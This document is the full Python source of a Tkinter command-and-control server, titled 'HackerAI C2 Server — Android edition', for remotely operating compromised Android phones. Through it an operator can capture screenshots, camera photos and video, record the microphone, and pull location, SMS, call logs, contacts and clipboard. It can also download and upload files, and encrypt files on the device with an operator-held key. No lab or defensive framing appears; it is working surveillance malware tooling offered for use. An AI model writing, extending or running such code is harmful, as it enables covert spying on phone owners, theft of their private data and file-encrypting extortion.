#!/usr/bin/env python3
"""
HackerAI C2 Server — Android edition
Run on Kali: python3 server.py
Requires: sudo apt install -y python3-tk python3-pil python3-pil.imagetk
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading, socket, json, base64, queue, os, uuid
from datetime import datetime
from PIL import Image, ImageTk
import io
import cv2
import numpy as np

# ─── Session ────────────────────────────────────────────────────────────────
class Session:
    def __init__(self, conn, addr, server, callback):
        self.id = uuid.uuid4().hex[:8]
        self.device_id = None
        self.conn = conn
        self.addr = addr
        self.server = server
        self.callback = callback
        self.running = True
        self.buffer = b""
        threading.Thread(target=self._recv_loop, daemon=True).start()
        self._log(f"Connection accepted from {addr[0]}:{addr[1]}")

    def send(self, data):
        try:
            self.conn.sendall(json.dumps(data).encode() + b"\n")
        except Exception:
            self.close()

    def _recv_loop(self):
        while self.running:
            try:
                data = self.conn.recv(65536)
                if not data:
                    break
                self.buffer += data
                while b"\n" in self.buffer:
                    line, self.buffer = self.buffer.split(b"\n", 1)
                    if line.strip():
                        try:
                            msg = json.loads(line.decode())
                        except json.JSONDecodeError:
                            continue
                        if msg.get("type") == "hello":
                            self.device_id = msg.get("device_id")
                            self.server._register_device(self)
                            continue
                        self.callback(self.id, msg)
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                break
        self.close()

    def close(self):
        if not self.running:
            return
        self.running = False
        try:
            self.conn.close()
        except Exception:
            pass
        self.server._remove_session(self.id)

    def _log(self, text):
        self.callback(self.id, {"type": "_log", "message": text})

    def __str__(self):
        dev = f" [{self.device_id}]" if self.device_id else ""
        return f"{self.id}{dev} ({self.addr[0]}:{self.addr[1]})"


# ─── C2 Server ──────────────────────────────────────────────────────────────
class C2Server:
    def __init__(self, gui_callback):
        self.socket = None
        self.running = False
        self.sessions = {}
        self.device_map = {}
        self.active_session = None
        self.callback = gui_callback

    def start(self, host="0.0.0.0", port=4444):
        if self.running:
            return False, "Server already running"
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((host, port))
            self.socket.listen(5)
            self.socket.settimeout(1.0)
            self.running = True
            threading.Thread(target=self._accept_loop, daemon=True).start()
            return True, f"Server listening on {host}:{port}"
        except Exception as e:
            self.running = False
            return False, str(e)

    def stop(self):
        self.running = False
        for sid in list(self.sessions.keys()):
            self.sessions[sid].close()
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.socket = None

    def disconnect_all(self):
        for sid in list(self.sessions.keys()):
            self.sessions[sid].close()

    def _accept_loop(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                session = Session(conn, addr, self, self._on_session_message)
                self.sessions[session.id] = session
                self.callback("", {"type": "session_open", "session": session})
            except socket.timeout:
                continue
            except OSError:
                break

    def _register_device(self, session):
        if not session.device_id:
            return
        old = self.device_map.get(session.device_id)
        if old and old in self.sessions and old != session.id:
            try:
                self.sessions[old].close()
            except Exception:
                pass
        self.device_map[session.device_id] = session.id
        if self.active_session is None:
            self.active_session = session.id
            self.callback("", {"type": "session_activate", "session_id": session.id})
        self.callback("", {"type": "session_registered",
                           "session_id": session.id,
                           "device_id": session.device_id})

    def _on_session_message(self, session_id, msg):
        self.callback(session_id, msg)

    def _remove_session(self, session_id):
        if session_id in self.sessions:
            for dev, sid in list(self.device_map.items()):
                if sid == session_id:
                    del self.device_map[dev]
            del self.sessions[session_id]
            self.callback("", {"type": "session_close", "session_id": session_id})
            if self.active_session == session_id:
                if self.sessions:
                    self.active_session = next(iter(self.sessions))
                    self.callback("", {"type": "session_activate",
                                       "session_id": self.active_session})
                else:
                    self.active_session = None

    def send_command(self, command, args=None):
        if not self.active_session or self.active_session not in self.sessions:
            return False, "No active session"
        msg = {"type": "command", "command": command, "args": args or {}}
        self.sessions[self.active_session].send(msg)
        return True, f"Sent {command}"

    def send_to_session(self, session_id, command, args=None):
        if session_id not in self.sessions:
            return False
        self.sessions[session_id].send({"type": "command", "command": command,
                                        "args": args or {}})
        return True


# ─── GUI ────────────────────────────────────────────────────────────────────
class C2GUI:
    BTN_OPTS = {"width": 14}
    BTN_PACK = {"side": tk.LEFT, "padx": 1, "pady": 1}

    def __init__(self, root):
        self.root = root
        self.root.title("HackerAI C2 Server — Android")
        self.root.geometry("1100x780")
        self.root.minsize(900, 650)

        self.server = C2Server(self.on_msg)
        self.save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captures")
        os.makedirs(os.path.join(self.save_dir, "screens"), exist_ok=True)
        os.makedirs(os.path.join(self.save_dir, "audio"), exist_ok=True)
        os.makedirs(os.path.join(self.save_dir, "downloads"), exist_ok=True)
        os.makedirs(os.path.join(self.save_dir, "video"), exist_ok=True)

        self.stream_active = False
        self.last_orig_w = 0
        self.last_orig_h = 0
        self.video_recording = False
        self.video_frames = []

        self._build_top_bar()
        self._build_middle()
        self._build_button_rows()
        self._build_status_bar()

        self.msg_queue = queue.Queue()
        self.root.after(100, self._process_queue)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    def on_msg(self, session_id, msg):
        self.msg_queue.put((session_id, msg))

    def _build_top_bar(self):
        top = ttk.Frame(self.root, padding=5)
        top.pack(fill=tk.X)
        ttk.Label(top, text="Host:").pack(side=tk.LEFT)
        self.host_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(top, textvariable=self.host_var, width=18).pack(side=tk.LEFT, padx=2)
        ttk.Label(top, text="Port:").pack(side=tk.LEFT, padx=(10, 0))
        self.port_var = tk.StringVar(value="4444")
        ttk.Entry(top, textvariable=self.port_var, width=8).pack(side=tk.LEFT, padx=2)
        self.btn_start = ttk.Button(top, text="Start Server", command=self._start_server)
        self.btn_start.pack(side=tk.LEFT, padx=4)
        self.btn_stop = ttk.Button(top, text="Stop Server",
                                   command=self._stop_server, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=4)
        self.btn_offline = ttk.Button(top, text="Offline",
                                      command=self._offline, state=tk.DISABLED)
        self.btn_offline.pack(side=tk.LEFT, padx=4)
        ttk.Label(top, text="Session:").pack(side=tk.LEFT, padx=(15, 0))
        self.session_var = tk.StringVar()
        self.session_combo = ttk.Combobox(top, textvariable=self.session_var,
                                          state="readonly", width=40)
        self.session_combo.pack(side=tk.LEFT, padx=2)
        self.session_combo.bind("<<ComboboxSelected>>", self._on_session_select)

    def _build_middle(self):
        mid = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
        mid.pack(fill=tk.BOTH, expand=True, padx=5, pady=2)
        self.img_frame = ttk.LabelFrame(mid, text="Display")
        self.img_label = ttk.Label(self.img_frame, text="No display data",
                                   background="#2d2d2d", foreground="white",
                                   anchor=tk.CENTER)
        self.img_label.pack(fill=tk.BOTH, expand=True)
        mid.add(self.img_frame, weight=3)
        txt_frame = ttk.LabelFrame(mid, text="Output / Log")
        self.output = scrolledtext.ScrolledText(txt_frame, wrap=tk.WORD,
                                                bg="#1e1e1e", fg="#d4d4d4",
                                                insertbackground="white",
                                                font=("Consolas", 10))
        self.output.pack(fill=tk.BOTH, expand=True)
        mid.add(txt_frame, weight=2)

    def _build_button_rows(self):
        btn_frame = ttk.LabelFrame(self.root, text="Actions", padding=3)
        btn_frame.pack(fill=tk.X, padx=5, pady=2)

        row1 = ttk.Frame(btn_frame)
        row1.pack(fill=tk.X, pady=1)
        for text, cmd in [
            ("Screenshot", lambda: self._send("screenshot")),
            ("Cam Front", lambda: self._send("cam_photo", {"camera": 1})),
            ("Cam Back", lambda: self._send("cam_photo", {"camera": 0})),
            ("Cam Video", self._start_video_stream),
            ("Audio Rec", self._cmd_audio_rec),
        ]:
            ttk.Button(row1, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

        row2 = ttk.Frame(btn_frame)
        row2.pack(fill=tk.X, pady=1)
        for text, cmd in [
            ("Screen Stream", lambda: self._start_stream("screen_stream")),
            ("Stop Stream", self._cmd_stop_stream),
            ("Location", lambda: self._send("location")),
            ("Call Log", lambda: self._send("call_log")),
            ("SMS", lambda: self._send("sms")),
        ]:
            ttk.Button(row2, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

        row3 = ttk.Frame(btn_frame)
        row3.pack(fill=tk.X, pady=1)
        for text, cmd in [
            ("Contacts", lambda: self._send("contacts")),
            ("Apps List", lambda: self._send("apps_list")),
            ("Clipboard Get", lambda: self._send("clipboard_get")),
            ("Proc List", lambda: self._send("proc_list")),
            ("Netstat", lambda: self._send("netstat")),
        ]:
            ttk.Button(row3, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

        row4 = ttk.Frame(btn_frame)
        row4.pack(fill=tk.X, pady=1)
        for text, cmd in [
            ("Sysinfo", lambda: self._send("sysinfo")),
            ("Kill PID", self._cmd_killpid),
            ("Download", self._cmd_download),
            ("Upload", self._cmd_upload),
            ("File Search", self._cmd_file_search),
        ]:
            ttk.Button(row4, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

        row5 = ttk.Frame(btn_frame)
        row5.pack(fill=tk.X, pady=1)
        for text, cmd in [
            ("Encrypt", self._cmd_encrypt),
            ("Decrypt", self._cmd_decrypt),
            ("Persist Info", lambda: self._send("persist_add")),
            ("Help", self._cmd_help),
        ]:
            ttk.Button(row5, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

        row6 = ttk.Frame(btn_frame)
        row6.pack(fill=tk.X, pady=1)
        self.pkg_var = tk.StringVar()
        ttk.Entry(row6, textvariable=self.pkg_var, width=16).pack(**self.BTN_PACK)
        for text, cmd in [
            ("Launch App", self._cmd_app_launch),
            ("Store Page", self._cmd_app_install),
            ("Open URL", self._cmd_open_url),
            ("Ping", lambda: self._send("ping")),
        ]:
            ttk.Button(row6, text=text, command=cmd, **self.BTN_OPTS).pack(**self.BTN_PACK)

    def _start_video_stream(self):
        if not self._require_session():
            return
        self._stop_stream()
        self.stream_active = True

        def ask_duration():
            dialog = tk.Toplevel(self.root)
            dialog.title("Set Duration")
            dialog.geometry("200x100")
            label = tk.Label(dialog, text="Enter duration in seconds:")
            label.pack()
            entry = tk.Entry(dialog)
            entry.pack()
            def ok():
                duration = entry.get()
                if duration.isdigit():
                    self.video_recording = True
                    ok, msg = self.server.send_command("cam_video")
                    self._log(f"[>] {msg}")
                    self.status_var.set("Cam Video streaming...")
                    self.video_frames = []
                    self.root.after(int(duration) * 1000, self._save_video)
                dialog.destroy()
            button = tk.Button(dialog, text="OK", command=ok)
            button.pack()

        ask_duration()

    def _save_video(self):
        if not self.video_frames:
            return
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_writer = cv2.VideoWriter(os.path.join(self.save_dir, "video", f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"), fourcc, 30.0, (640, 480))
        for frame in self.video_frames:
            img = Image.open(io.BytesIO(base64.b64decode(frame)))
            img = img.resize((640, 480))
            img = np.array(img)
            video_writer.write(img)
        video_writer.release()
        self.video_frames = []
        self.video_recording = False
        self._log("Video saved!")

    def _handle_msg(self, session_id, msg):
        mt = msg.get("type", "")

        if mt == "_log":
            self._log(f"[{session_id}] {msg.get('message', '')}")

        elif mt == "session_open":
            self._log(f"[+] New connection: {msg['session']} (awaiting device hello)")
            self._refresh_session_list()

        elif mt == "session_registered":
            self._log(f"[>] Device registered: {msg['device_id']} -> {msg['session_id']}")
            self._refresh_session_list()

        elif mt == "session_close":
            self._log(f"[-] Session closed: {session_id}")
            self._refresh_session_list()

        elif mt == "session_activate":
            self._log(f"[>] Active session: {msg['session_id']}")
            self._refresh_session_list()

        elif mt == "result":
            status = msg.get("status", "error")
            command = msg.get("command", "")
            data = msg.get("data", "")
            if status != "success":
                self._log(f"[✗] {command}: {data or 'Unknown error'}")
                return
            if command == "screenshot":
                try:
                    img = Image.open(io.BytesIO(base64.b64decode(data)))
                    self._display_image(img)
                    fname = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
                    path = os.path.join(self.save_dir, "screens", fname)
                    img.save(path, format="PNG")
                    self._log(f"[✓] Screenshot saved -> {path}")
                except Exception as e:
                    self._log(f"[!] Screenshot decode error: {e}")
            elif command == "audio_record":
                try:
                    raw = base64.b64decode(data)
                    fname = datetime.now().strftime("%Y%m%d_%H%M%S") + ".m4a"
                    path = os.path.join(self.save_dir, "audio", fname)
                    with open(path, "wb") as f:
                        f.write(raw)
                    self._log(f"[✓] Audio saved ({len(raw)} bytes) -> {path}")
                except Exception as e:
                    self._log(f"[!] Audio save error: {e}")
            elif command == "download_file":
                try:
                    raw = base64.b64decode(data)
                    fname = datetime.now().strftime("%H%M%S") + "_download.bin"
                    path = os.path.join(self.save_dir, "downloads", fname)
                    with open(path, "wb") as f:
                        f.write(raw)
                    self._log(f"[✓] Downloaded ({len(raw)} bytes) -> {path}")
                except Exception as e:
                    self._log(f"[!] Download error: {e}")
            elif command == "upload_file":
                self._log(f"[✓] Upload complete: {data}")
            else:
                self._log(f"[✓] {command}:\n{data}")

        elif mt == "stream":
            try:
                img = Image.open(io.BytesIO(base64.b64decode(msg.get("data", ""))))
                self._display_image(img)
                if self.video_recording:
                    self.video_frames.append(msg.get("data", ""))
            except Exception:
                pass

    def _process_queue(self):
        try:
            while True:
                session_id, msg = self.msg_queue.get_nowait()
                self._handle_msg(session_id, msg)
        except queue.Empty:
            pass
        self.root.after(100, self._process_queue)

    def _build_status_bar(self):
        status = ttk.Frame(self.root)
        status.pack(fill=tk.X, side=tk.BOTTOM)
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(status, textvariable=self.status_var, relief=tk.SUNKEN,
                  anchor=tk.W, font=("Consolas", 9)).pack(fill=tk.X)

    def _start_server(self):
        host = self.host_var.get().strip() or "0.0.0.0"
        try:
            port = int(self.port_var.get().strip() or "4444")
        except ValueError:
            messagebox.showerror("Error", "Port must be a number")
            return
        ok, msg = self.server.start(host, port)
        if ok:
            self.btn_start.config(state=tk.DISABLED)
            self.btn_stop.config(state=tk.NORMAL)
            self.btn_offline.config(state=tk.NORMAL)
            self._log(f"[+] {msg}")
            self.status_var.set(f"Listening on {host}:{port}")
        else:
            messagebox.showerror("Error", msg)

    def _stop_server(self):
        self._stop_stream()
        self.server.stop()
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.btn_offline.config(state=tk.DISABLED)
        self.session_combo.set("")
        self.session_combo["values"] = ()
        self._log("[-] Server stopped")

    def _offline(self):
        self._stop_stream()
        self.server.disconnect_all()
        self._log("[-] All clients disconnected")

    def _on_close(self):
        self._stop_stream()
        self.server.stop()
        self.root.destroy()

    def _on_session_select(self, event=None):
        sel = self.session_var.get()
        for sid, sess in self.server.sessions.items():
            if str(sess) == sel:
                self.server.active_session = sid
                self._log(f"[>] Switched to session {sid}")
                break

    def _refresh_session_list(self):
        vals = [str(s) for s in self.server.sessions.values()]
        self.session_combo["values"] = vals
        if self.server.active_session and self.server.active_session in self.server.sessions:
            cur = str(self.server.sessions[self.server.active_session])
            if cur != self.session_var.get():
                self.session_var.set(cur)
        elif vals:
            self.session_var.set(vals[0])

    def _require_session(self):
        if not self.server.active_session or \
           self.server.active_session not in self.server.sessions:
            messagebox.showwarning("No Session", "No active client session.")
            return False
        return True

    def _send(self, command, args=None):
        if not self._require_session():
            return
        ok, msg = self.server.send_command(command, args)
        self._log(f"[>] {msg}")

    def _start_stream(self, command):
        if not self._require_session():
            return
        self._stop_stream()
        self.stream_active = True
        ok, msg = self.server.send_command(command)
        self._log(f"[>] {msg}")
        self.status_var.set(f"{command} streaming...")

    def _stop_stream(self):
        if self.stream_active and self.server.active_session:
            self.server.send_to_session(self.server.active_session, "stop_stream")
        self.stream_active = False

    def _cmd_stop_stream(self):
        if not self._require_session():
            return
        self._stop_stream()
        self._log("[>] Sent stop_stream")

    def _cmd_audio_rec(self):
        dur = self._ask_input("Audio Record", "Duration in seconds (3-60):", "10")
        if dur and dur.strip().isdigit():
            self._send("audio_record", {"duration": int(dur.strip())})

    def _cmd_killpid(self):
        pid = self._ask_input("Kill PID", "Enter PID to kill:")
        if pid and pid.strip().isdigit():
            self._send("kill_pid", {"pid": int(pid.strip())})

    def _cmd_download(self):
        if not self._require_session():
            return
        path = self._ask_input("Download File",
                               "Remote file path (e.g. /sdcard/Download/x.jpg):")
        if path:
            self._send("download_file", {"path": path.strip()})

    def _cmd_upload(self):
        if not self._require_session():
            return
        path = filedialog.askopenfilename(title="Select file to upload")
        if path:
            try:
                with open(path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                ok, msg = self.server.send_command(
                    "upload_file", {"filename": os.path.basename(path), "data": data})
                self._log(f"[>] Uploading {os.path.basename(path)}...")
            except Exception as e:
                self._log(f"[!] Upload error: {e}")

    def _cmd_file_search(self):
        pattern = self._ask_input("File Search",
                                  "Pattern (e.g. .jpg or Document). Blank = list all files:")
        if pattern is not None:
            self._send("file_search", {"pattern": pattern.strip()})

    def _cmd_encrypt(self):
        path = self._ask_input("File Encrypt",
                               "Remote file path (BLANK = all files in app storage):")
        if path is None:
            return
        key = self._ask_input("File Encrypt — Key",
                              "Any secret string. SAVE IT — it's needed to decrypt:")
        if key:
            self._send("file_encrypt", {"path": path.strip(), "key": key.strip()})
            self._log(f"[KEY] (host-side note) {datetime.now():%Y%m%d_%H%M%S} key={key.strip()}")

    def _cmd_decrypt(self):
        path = self._ask_input("File Decrypt",
                               "Remote file path (BLANK = all .enc in app storage):")
        if path is None:
            return
        key = self._ask_input("File Decrypt — Key", "Paste the encryption key:")
        if key:
            self._send("file_decrypt", {"path": path.strip(), "key": key.strip()})

    def _cmd_app_launch(self):
        pkg = self.pkg_var.get().strip()
        if pkg:
            self._send("app_launch", {"package": pkg})

    def _cmd_app_install(self):
        pkg = self.pkg_var.get().strip()
        if pkg:
            self._send("app_install", {"package": pkg})

    def _cmd_open_url(self):
        url = self.pkg_var.get().strip()
        if url:
            self._send("open_url", {"url": url})

    def _cmd_help(self):
        self._log("""=== Android Agent Commands ===

Screenshot      One-shot screen capture -> saved to captures/screens/
Cam Front/Back  Photo from camera -> shown in Display
Cam Video       Live camera stream (JPEG frames)
Audio Rec       Record mic N seconds -> saved to captures/audio/
Screen Stream   Live screen (view-only; touch control not possible w/o root)
Stop Stream     Stops all streams
Location        GPS/network last-known position + Maps link
Call Log / SMS / Contacts / Apps List
Clipboard Get   May be blocked by Android 10+ for background apps
Proc List       Running processes (from /proc)
Netstat         Network connections (from /proc/net)
Kill PID        Kill a process the app owns (system apps can't be killed)
Download        Pull a file from the phone (max 20 MB)
Upload          Push a file to the app's private storage
File Search     Search filenames on shared storage
Encrypt/Decrypt AES with your key (app's private storage)
Launch App / Store Page / Open URL   — type package/URL in the box
Ping            Connectivity check
""")

    def _ask_input(self, title, prompt, initial=""):
        dialog = tk.Toplevel(self.root)
        dialog.title(title)
        dialog.geometry("520x140")
        label = tk.Label(dialog, text=prompt)
        label.pack()
        var = tk.StringVar(value=initial)
        entry = tk.Entry(dialog, textvariable=var, width=60)
        entry.pack()
        entry.focus()
        res = {"value": None}

        def on_ok():
            res["value"] = var.get()
            dialog.destroy()

        def on_cancel():
            dialog.destroy()

        btnf = ttk.Frame(dialog)
        btnf.pack(pady=5)
        ttk.Button(btnf, text="OK", command=on_ok).pack(side=tk.LEFT, padx=5)
        ttk.Button(btnf, text="Cancel", command=on_cancel).pack(side=tk.LEFT, padx=5)
        dialog.bind("<Return>", lambda e: on_ok())
        self.root.wait_window(dialog)
        return res["value"]

    def _log(self, text):
        ts = datetime.now().strftime("%H:%M:%S")
        self.output.insert(tk.END, f"[{ts}] {text}\n")
        self.output.see(tk.END)
        self.status_var.set(text[:80] if text else "Ready")

    def _display_image(self, pil_img):
        try:
            self.last_orig_w, self.last_orig_h = pil_img.size
            max_w = self.img_frame.winfo_width() - 20 or 600
            max_h = self.img_frame.winfo_height() - 20 or 400
            pil_img.thumbnail((max_w, max_h), Image.LANCZOS)
            photo = ImageTk.PhotoImage(pil_img)
            self.img_label.config(image=photo, text="")
            self.img_label.image = photo
        except Exception as e:
            self._log(f"[!] Display error: {e}")

def main():
    root = tk.Tk()
    app = C2GUI(root)
    try:
        root.mainloop()
    except KeyboardInterrupt:
        app._on_close()


if __name__ == "__main__":
    main()
